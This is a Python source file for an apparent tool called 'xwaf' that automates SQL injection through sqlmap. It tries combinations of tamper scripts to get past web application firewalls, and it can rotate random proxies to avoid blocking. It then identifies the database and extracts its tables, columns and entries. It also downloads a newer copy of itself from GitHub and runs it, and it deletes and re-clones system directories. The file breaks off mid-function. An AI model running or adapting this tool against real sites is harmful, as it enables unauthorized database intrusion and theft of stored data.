import os
import time
import re
import itertools
from urllib.parse import urlparse
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry,xwaf requires Python 3.x\n")
    sys.exit(1)

os.system("pip3 install exp10it -U --no-cache")
from exp10it import figlet2file
from exp10it import update_config_file_key_value
from exp10it import get_key_value_from_config_file
from exp10it import CLIOutput
from exp10it import get_input_intime
from exp10it import get_http_or_https
from exp10it import homePath
from exp10it import get_string_from_command
from exp10it import get_request


class Program(object):

    def __init__(self):
        self.currentVersion=1.13
        a=get_string_from_command("sqlmap")
        if not os.path.exists("/usr/share/sqlmap/sqlmap.py"):
            os.system("git clone https://github.com/sqlmapproject/sqlmap.git /usr/share/sqlmap")
        if re.search(r"not found",a,re.I):
            os.system("ln -s /usr/share/sqlmap/sqlmap.py /usr/local/bin/sqlmap")

        self.selfUpdate()
        self.checkSqlmapTamperUpdate()
        self.output = CLIOutput()
        self.try_times = 0
        #rflag为1代表sqlmap的参数中有-r选项
        self.rflag=0
        self.useProxy=False
        figlet2file("xwaf", 0, True)
        print("currentVersion:%s" % self.currentVersion)
        self.handle_url()
        self.log_file = homePath+"/.sqlmap/output/" + urlparse(self.url).hostname + "/log"
        self.log_config_file = self.log_file[:-3] + "config_file.ini"
        self.has_good_sqli_type = 0
        #下面这句决定在全局是否加代理
        self.output.useProxy=self.useProxy
        parsed = urlparse(self.url)
        safe_url = parsed.scheme + "://" + parsed.netloc
        if self.rflag==0:
            self.sm_command = '''sqlmap -u "%s" --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --level 3 --smart''' % (self.url, safe_url)
        else:
            self.sm_command = '''sqlmap --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --level 3 --smart''' % safe_url

        self.sm_hex_command = self.sm_command + " --hex"
        self.sm_no_cast_command = self.sm_command + " --no-cast"

        self.MYSQL = []
        self.MSSQL = []
        self.ORACLE = []
        self.PGSQL = []
        self.ACCESS = []
        self.SQLITE = []
        self.DB2 = []
        self.FIREBIRD = []
        self.MAXDB = []
        self.SYBASE = []
        self.HSQLDB = []
        os.system('rm /usr/share/sqlmap/tamper/*.pyc')
        tamper_names = os.listdir('/usr/share/sqlmap/tamper')
        tamper_names.remove('__init__.py')

        for each_script in tamper_names:
            self.check_DB_type_from_script(each_script)

        print('mysql:')
        print(self.MYSQL)
        print('mssql:')
        print(self.MSSQL)
        print('oracle:')
        print(self.ORACLE)
        print('postgresql:')
        print(self.PGSQL)
        print('sqlite:')
        print(self.SQLITE)
        print('access:')
        print(self.ACCESS)
        print('db2:')
        print(self.DB2)
        print('firebird:')
        print(self.FIREBIRD)
        print('maxdb:')
        print(self.MAXDB)
        print('sybase:')
        print(self.SYBASE)
        print('hsqldb:')
        print(self.HSQLDB)

        if os.path.exists(self.log_config_file)==False:
            #log_config_file不存在,说明xwaf没跑过,开始时用sm_command跑,生成log_config_file,并将当前跑过的命令记录下来
            self.output.os_system_combine_argv_with_bottom_status(self.sm_command)

            # 下面这个列表是跑过的命令,每次跑一个命令时,先检测这个命令是否在下面这个列表中,如果在,说明这个命令跑过了,略过这
            # 个要跑的命令
            update_config_file_key_value(self.log_config_file, 'default', 'finished_command_list', [])
            # 下面这个列表是成功绕过的命令
            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [])
            # 下面两句初始化产生的内容为hex_or_no_cast列表和tamper_list列表的配置文件
            update_config_file_key_value(self.log_config_file, 'default', 'hex_or_no_cast', [])
            update_config_file_key_value(self.log_config_file, 'default', 'tamper_list', [])

            current_finished_command_list=[self.sm_command]
        else:
            #log_config_file存在,说明xwaf跑过,开始时用sm_command跑,并将当前跑过的命令记录下来
            current_finished_command_list = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'finished_command_list'))
            if self.sm_command in current_finished_command_list:
                pass
            else:
                self.output.os_system_combine_argv_with_bottom_status(self.sm_command)
                current_finished_command_list.append(self.sm_command)
        update_config_file_key_value(self.log_config_file, 'default','finished_command_list', current_finished_command_list)

        has_sqli = self.get_log_file_need_tamper()
        if has_sqli == 0:
            # 如果没有漏洞就不再进行后面的检测了
            sys.exit(0)
        self.get_db_type_need_tamper()
        # 设置默认找不到数据库类型则将目标当作MYSQL
        db_type = self.get_db_type_from_log_file(self.log_file)
        if db_type != 0:
            update_config_file_key_value(self.log_config_file, 'default', 'db_type', '"' + db_type + '"')
        else:
            update_config_file_key_value(self.log_config_file, 'default', 'db_type', '"MYSQL"')
        # get_db_type_need_tamper函数运行前获取db_type从log_file中获取,get_db_type_need_tamper函数运行之后获取
        # db_type从config_file中获取
        # 下面在以后的注入语句中加上数据库类型加快注入速度
        db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
        self.sm_command = self.sm_command + " --dbms=%s" % db_type
        self.sm_hex_command = self.sm_hex_command + " --dbms=%s" % db_type
        self.sm_no_cast_command = self.sm_no_cast_command + " --dbms=%s" % db_type

        if db_type != 'ACCESS':
            # ACCESS数据库将不运行get_good_sqli_type_need_tamper()[一般是B注入方法]和get_db_name_need_tamper()[--current_db会得
            # 到None的结果]函数
            # has_good_sqli_type这个值要作为后面函数的全局变量来用
            self.has_good_sqli_type = self.get_good_sqli_type_need_tamper()
            self.get_db_name_need_tamper()

        #下面在全局的sql注入语句中加入-D db_name[如果数据库不是ACCESS]
        db_name = self.get_db_name_from_log_file(self.log_file)[0]
        self.sm_command= self.sm_command+" -D "+db_name if db_type!='ACCESS' else self.sm_command
        self.sm_hex_command = self.sm_command + " --hex"
        self.sm_no_cast_command = self.sm_command + " --no-cast"
        #上面的3句之后,以后出现在代码中的sql注入语句就没有-D db_name这样的string了

        self.get_table_name_need_tamper()
        self.get_column_name_need_tamper()
        has_entries = self.get_entries_need_tamper()
        if has_entries == 1:
            succeedCmd=eval(get_key_value_from_config_file(self.log_config_file, 'default', 'bypassed_command'))
            self.output.good_print("成功获取数据的命令是:\n%s" % succeedCmd, 'red')

        self.output.good_print('you tried %d different combination of tampers' % self.try_times, 'red')


    def selfUpdate(self):
        #自动更新
        def getVersion(file):
            with open("/tmp/xwaf.py","r+") as f:
                content=f.read()
            latestVersion=re.search(r"self\.currentVersion\s*=\s*(.*)",content).group(1)
            latestVersion=float(latestVersion)
            return latestVersion

        os.system("wget https://raw.githubusercontent.com/3xp10it/bypass_waf/master/xwaf.py -O /tmp/xwaf.py -q")
        latestVersion=getVersion("/tmp/xwaf.py")
        if latestVersion>self.currentVersion:
            print("Attention! New version exists,I will update xwaf.py to the latest version.")
            currentScriptDirPath=os.path.dirname(os.path.abspath(__file__))+'/'
            os.system("cp /tmp/xwaf.py %sxwaf.py" % currentScriptDirPath)
            print("Update finished! :)")
            oldArgvList=sys.argv[1:]
            newString=""
            for each in oldArgvList:
                if re.search(r"\s",each):
                    newString+=(" "+'"'+each+'"')
                else:
                    newString+=(" "+each)

            newCommand="python3 "+currentScriptDirPath+newString+"xwaf.py"+newString
            #print("new cmd:\n"+newCommand)
            os.system(newCommand)
            sys.exit(0)
        else:
            return

    def checkSqlmapTamperUpdate(self):
        #检测sqlmap的tamper有没有更新,如果有更新则自动更新
        req=get_request("https://github.com/sqlmapproject/sqlmap/tree/master/tamper")
        html=req['content']
        a=re.findall(r"\w+\.py",html)
        allTamperNameList=[]
        for each in a:
            if each not in allTamperNameList and each!="__init__.py":
                allTamperNameList.append(each)
        newTamperNum=len(allTamperNameList)

        tamperList=os.listdir("/usr/share/sqlmap/tamper")
        localTamperNum=len(tamperList)
        #print(localTamperNum)
        if "__init__.py" in tamperList:
            localTamperNum-=1

        if newTamperNum>localTamperNum:
            print("检测到sqlmap的tamper有更新,现在更新,请稍等...")
            os.system("rm -r /usr/share/sqlmap")
            os.system("git clone https://github.com/sqlmapproject/sqlmap.git /usr/share/sqlmap")


    def usage(self):
        self.output.good_print('''You can use this script like this:
eg:
1.python3 xwaf.py -u "http://www.baidu.com/1.php?id=1"
2.python3 xwaf.py -u "http://www.baidu.com/1.php" --data="postdata" -p xxx
3.python3 xwaf.py -r /tmp/headerfile -p xxx --level 5

Actually,xwaf.py supports all parameters[except for param '-m' and '-l'] in sqlmap,you can use xwaf as same as
sqlmap's usage.''','yellow')

    def handle_url(self):
        if len(sys.argv) == 1:
            self.usage()
            sys.exit(0)
        else:
            if "-m" in sys.argv[1:] or "-l" in sys.argv[1:]:
                print("Sorry,xwaf.py does not support param '-m' and '-l'")
                self.usage()
                sys.exit(1)

            print("Do you want to use random proxy from the Internet on each different sqlmap command to anti \
blocked by waf for your mass requests? [N|y]")
            choose=get_input_intime('n',5)
            if choose=='y' or choose=='Y':
                self.useProxy=True

            self.url=""
            tmp=sys.argv[1:] 
            index=0
            for each in tmp:
                if each=="-u":
                    self.url=tmp[index+1]
                    break
                index+=1
            if self.url=="":
                if "-r" in sys.argv[1:]:
                    self.rflag=1
                    tmpIndex=0
                    tmpList=sys.argv[1:]
                    for each in tmpList:
                        if each=="-r":
                            readFile=tmpList[tmpIndex+1]
                            break
                        tmpIndex+=1
                    with open(readFile,"r+") as f:
                        allLines=f.readlines()
                    findHost=0
                    for eachLine in allLines:
                        if re.search("host:",eachLine,re.I):
                            hostValue=re.search("host:\s?([\S]+)",eachLine,re.I).group(1)
                            self.url=get_http_or_https(hostValue)+"://"+hostValue
                            findHost=1
                            break
                    if findHost==0:
                        print("Although you provide a header file,but I can not find host value")
                        sys.exit(1)
                else:
                    print("Sorry,I can not find a url:(")
                    self.usage()
                    sys.exit(1)



    def get_db_type_from_log_file(self, log_file):
        with open(log_file, "r+") as f:
            log_content = f.read()
        # 下面的数据库类型在/usr/share/sqlmap/lib/core/enums.py文件中可得
        mysql_pattern = re.compile(r"MySQL", re.I)
        mssql_pattern = re.compile(r"(Microsoft SQL Server)|(MSSQL)", re.I)
        oracle_pattern = re.compile(r"Oracle", re.I)
        postgresql_pattern = re.compile(r"(PostgreSQL)|(PGSQL)", re.I)
        access_pattern = re.compile(r"(Microsoft Access)|(Access)", re.I)
        #access特殊pattern
        accessSpecialPattern=re.compile(r"MSysAccessObjects",re.I)
        sqlite_pattern = re.compile(r"SQLite", re.I)
        DB2_pattern = re.compile(r"(IBM DB2)|(DB2)", re.I)
        FIREBIRD_pattern = re.compile(r"Firebird", re.I)
        maxdb_pattern = re.compile(r"SAP MaxDB", re.I)
        sybase_pattern = re.compile(r"Sybase", re.I)
        HSQLDB_pattern = re.compile(r"HSQLDB", re.I)
        find_list = re.findall(r"back-end DBMS:(.*)", log_content)
        if find_list:
            for each in find_list:
                if re.search(mysql_pattern, each):
                    return "MYSQL"
                if re.search(mssql_pattern, each):
                    return "MSSQL"
                if re.search(oracle_pattern, each):
                    return "ORACLE"
                if re.search(postgresql_pattern, each):
                    return "PGSQL"
                if re.search(access_pattern, each):
                    return "ACCESS"
                if re.search(sqlite_pattern, each):
                    return "SQLITE"
                if re.search(DB2_pattern, each):
                    return "DB2"
                if re.search(FIREBIRD_pattern, each):
                    return "FIREBIRD"
                if re.search(maxdb_pattern, each):
                    return "MAXDB"
                if re.search(sybase_pattern, each):
                    return "SYBASE"
                if re.search(HSQLDB_pattern, each):
                    return "HSQLDB"
        elif re.search(accessSpecialPattern,log_content):
            return "ACCESS"
        else:
            self.output.good_print("can not get db type from log file,I will return 0", 'red')
            return 0

    def get_sqli_type_from_log_file(self, log_file):
        # 从log文件中获取注入方法有哪些eg.B|T|U|E|S|Q
        # 其中B|T|Q一般比U|E|S有更好的过waf的效果
        # 而U|E|S比B|T|Q有更快的注入速度和更高的注入权限
        sqli_type = []
        with open(log_file, "r+") as f:
            log_content = f.read()
        # 下面的pattern可从/usr/share/sqlmap/lib/core/enums.py中获得
        B_sqli_type_pattern = re.compile(r"Type:.*boolean-based blind", re.I)
        T_sqli_type_pattern = re.compile(r"Type:.*time-based blind", re.I)
        Q_sqli_type_pattern = re.compile(r"Type:.*inline query", re.I)
        U_sqli_type_pattern = re.compile(r"Type:.*UNION query", re.I)
        E_sqli_type_pattern = re.compile(r"Type:.*error-based", re.I)
        S_sqli_type_pattern = re.compile(r"Type:.*stacked queries", re.I)
        if re.search(B_sqli_type_pattern, log_content):
            sqli_type.append('B')
        if re.search(T_sqli_type_pattern, log_content):
            sqli_type.append('T')
        if re.search(Q_sqli_type_pattern, log_content):
            sqli_type.append('Q')
        if re.search(U_sqli_type_pattern, log_content):
            sqli_type.append('U')
        if re.search(E_sqli_type_pattern, log_content):
            sqli_type.append('E')
        if re.search(S_sqli_type_pattern, log_content):
            sqli_type.append('S')
        return sqli_type

    def get_db_name_from_log_file(self, log_file):
        with open(log_file, "r+") as f:
            log_content = f.read()
        find_list = re.findall(r'''current database:[\s]*('|")*([^\s'"]+)''', log_content)
        db_name_list = []
        if find_list:
            for each in find_list:
                if each[1] not in db_name_list and each[1] != "None":
                    db_name_list.append(each[1])
            return db_name_list
        else:
            self.output.good_print("can not get db name from log file,I will return 0", 'red')
            return 0

    def get_table_name_from_log_file(self, log_file):
        # 这个函数返回当前current_db的第一个表名
        with open(log_file, "r+") as f:
            log_content = f.read()
        # 下面的正则查找current_db的第一个表名
        db_type=eval(get_key_value_from_config_file(self.log_config_file,'default','db_type'))
        if db_type=='ACCESS':
            current_db='Microsoft_Access_masterdb'
        else:
            current_db= self.get_db_name_from_log_file(self.log_file)[0]
        find_list = re.findall(r"Database:[\s]*(%s)[\s]+\[\d{1,3}\s+tables\]\s\+\-+\+\s\|\s+([^\s]+)\s" % current_db, log_content)
        table_list = []
        if find_list:
            for each in find_list:
                if each not in table_list:
                    table_list.append(each)
            return table_list[0][1]
        else:
            self.output.good_print("can not get any table from log file,I will return 0", 'red')
            return 0

    def get_column_name_from_log_file(self, log_file):
        # 找出column,不用找出column的具体值,只要log文件中有column出现即可
        with open(log_file, "r+") as f:
            log_content = f.read()
        find_column = re.search(r"\[(\d{1,3}) columns\]", log_content)
        if find_column:
            return 1
        else:
            self.output.good_print("can not get any column from log file,I will return 0", 'red')
            return 0

    def get_entries_from_log_file(self, log_file):
        # 找出entries,不用找出entries的具体值,只要log文件中有entries出现即可
        with open(log_file, "r+") as f:
            log_content = f.read()
        find_entries = re.search(r"\[(\d{1,3} entries)|(1 entry)\]", log_content)
        if find_entries:
            return 1
        else:
            self.output.good_print("can not get any entries from log file,I will return 0", 'red')
            return 0

    def check_DB_type_from_script(self, script_name):
        script_has_any_DB = 0
        with open('/usr/share/sqlmap/tamper/' + script_name, 'r+') as f:
            tamper_content = f.read()

        mysql_pattern = re.compile(r"MySQL", re.I)
        mssql_pattern = re.compile(r"(Microsoft SQL Server)|(MSSQL)", re.I)
        oracle_pattern = re.compile(r"Oracle", re.I)
        postgresql_pattern = re.compile(r"(PostgreSQL)|(PGSQL)", re.I)
        access_pattern = re.compile(r"(Microsoft Access)|(Access)", re.I)
        sqlite_pattern = re.compile(r"SQLite", re.I)
        DB2_pattern = re.compile(r"(IBM DB2)|(DB2)", re.I)
        FIREBIRD_pattern = re.compile(r"Firebird", re.I)
        maxdb_pattern = re.compile(r"SAP MaxDB", re.I)
        sybase_pattern = re.compile(r"Sybase", re.I)
        HSQLDB_pattern = re.compile(r"HSQLDB", re.I)

        if re.search(mysql_pattern, tamper_content) and script_name[:-3] not in self.MYSQL:
            self.MYSQL.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(mssql_pattern, tamper_content) and script_name[:-3] not in self.MSSQL:
            self.MSSQL.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(oracle_pattern, tamper_content) and script_name[:-3] not in self.ORACLE:
            self.ORACLE.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(postgresql_pattern, tamper_content) and script_name[:-3] not in self.PGSQL:
            self.PGSQL.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(access_pattern, tamper_content) and script_name[:-3] not in self.ACCESS:
            self.ACCESS.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(sqlite_pattern, tamper_content) and script_name[:-3] not in self.SQLITE:
            self.SQLITE.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(DB2_pattern, tamper_content) and script_name[:-3] not in self.DB2:
            self.DB2.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(FIREBIRD_pattern, tamper_content) and script_name[:-3] not in self.FIREBIRD:
            self.FIREBIRD.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(maxdb_pattern, tamper_content) and script_name[:-3] not in self.MAXDB:
            self.MAXDB.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(sybase_pattern, tamper_content) and script_name[:-3] not in self.SYBASE:
            self.SYBASE.append(script_name[:-3])
            script_has_any_DB = 1

        if re.search(HSQLDB_pattern, tamper_content) and script_name[:-3] not in self.HSQLDB:
            self.HSQLDB.append(script_name[:-3])
            script_has_any_DB = 1

        if script_has_any_DB == 0 and script_name[:-3] not in self.MYSQL + self.MSSQL + self.ORACLE + self.PGSQL + self.ACCESS + self.SQLITE + self.DB2 + self.FIREBIRD + self.MAXDB + self.SYBASE + self.HSQLDB:
            self.MYSQL.append(script_name[:-3])
            self.MSSQL.append(script_name[:-3])
            self.ORACLE.append(script_name[:-3])
            self.PGSQL.append(script_name[:-3])
            self.ACCESS.append(script_name[:-3])
            self.SQLITE.append(script_name[:-3])
            self.DB2.append(script_name[:-3])
            self.FIREBIRD.append(script_name[:-3])
            self.MAXDB.append(script_name[:-3])
            self.SYBASE.append(script_name[:-3])
            self.HSQLDB.append(script_name[:-3])

    def test_tamper_string(self, tamper_string, forwhat):
        # 根据forwhat的目的来测试当前tamper_string是否能达到目的
        # 成功达到目的返回1,否则返回0
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # tamper_string是tamepr1,tamper2的格式
        import subprocess
        import re
        # 下面这段用来获取当前将使用的tamper_string,这个tamper_string由test_tamper_string函数传入的tamper_string参数
        # 和已经获得的tamper_list共同决定
        current_tamper_list = eval(get_key_value_from_config_file(
            self.log_config_file, 'default', 'tamper_list'))
        if current_tamper_list == []:
            # 已经获得过的tamper_list为空
            tamper_string = tamper_string
        else:
            # 已经获得过的tamper_list不为空
            if "," not in tamper_string:
                # 当前传入的tamper_string只有一种tamper
                if tamper_string in current_tamper_list:
                    # 此时返回0,相当于这个测试已经测过了,不再测
                    return 0
                else:
                    tamper_string = self.get_from_tuple(current_tamper_list.append(tamper_string))
            else:
                # 当前传入的tamper_string有超过一种tamper
                for each_tamper in tamper_string.split(","):
                    if each_tamper not in current_tamper_list:
                        current_tamper_list.append(each_tamper)
                if current_tamper_list == eval(get_key_value_from_config_file(self.log_config_file, 'default', 'tamper_list')):
                    # 说明当前传入的tamper_string中的每个tamper在已经获得过的tamper_list中都存在,说明之前已经测过了
                    # 不再测
                    return 0
                else:
                    tamper_string = self.get_from_tuple(current_tamper_list)

        self.sm_command_with_tamper = self.sm_command + " --tamper=%s" % tamper_string
        self.sm_hex_command_with_tamper = self.sm_command_with_tamper + " --hex"
        self.sm_no_cast_command_with_tamper = self.sm_command_with_tamper + " --no-cast"

        if forwhat == 'log_file':
            # 为了获取有内容的log_file[也即检测出目标url有sqli漏洞]而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取有内容的log,也即检测出目标url有sqli...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command_with_tamper in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper)
                    current_finished_command_list.append(self.sm_command_with_tamper)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.check_log_has_content(self.log_file) == True:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s检测到了当前url有sqli" %
                                               tamper_string, 'red')
                        flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command_with_tamper in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper)
                        current_finished_command_list.append(self.sm_hex_command_with_tamper)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        if self.check_log_has_content(self.log_file) == True:
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url有sqli" % tamper_string, 'red')
                            flag = 1
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_no_cast_command_with_tamper in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper)
                        current_finished_command_list.append(self.sm_no_cast_command_with_tamper)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        if self.check_log_has_content(self.log_file) == True:
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url有sqli" % tamper_string, 'red')
                            flag = 1
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                    current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.check_log_has_content(self.log_file) == True:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项检测到了当前url有sqli" %
                                               (tamper_string, hex_or_no_cast), 'red')
                        # return 1代表达到forwhat的目的
                        flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'db_type':
            # 为了获取数据库类型而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取数据库类型...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command_with_tamper in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper)
                    current_finished_command_list.append(self.sm_command_with_tamper)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.check_log_has_content(self.log_file) == True:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s检测到了当前url的数据库类型" %
                                               tamper_string, 'red')
                        flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command_with_tamper in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper)
                        current_finished_command_list.append(self.sm_hex_command_with_tamper)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        if self.get_db_type_from_log_file(self.log_file) != 0:
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项检测到了当前url的数据库类型" % tamper_string, 'red')
                            flag = 1
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_no_cast_command_with_tamper in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper)
                            current_finished_command_list.append(self.sm_no_cast_command_with_tamper)
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            if self.get_db_type_from_log_file(self.log_file) != 0:
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项检测到了当前url的数据库类型" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                    current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    if self.get_db_type_from_log_file(self.log_file) != 0:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项检测到了当前url的数据库类型" %
                                               (tamper_string, hex_or_no_cast), 'red')
                        flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'good_sqli_type':
            # 为了获取E|U|S高效注入方法而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取E|U|S高效注入方法...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command_with_tamper + " --technique=USE" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE")
                    current_finished_command_list.append(self.sm_command_with_tamper + " --technique=USE")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了U|E|S一种以上的高效注入方法"
                                               % tamper_string, 'red')
                        flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command_with_tamper + " --technique=USE" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_hex_command_with_tamper + " --technique=USE")
                        current_finished_command_list.append(
                            self.sm_hex_command_with_tamper + " --technique=USE")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                        if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                            self.output.good_print(
                                "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了U|E|S一种以上的高效注入方法" % tamper_string, 'red')
                            flag = 1
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_finished_command_list = eval(get_key_value_from_config_file(
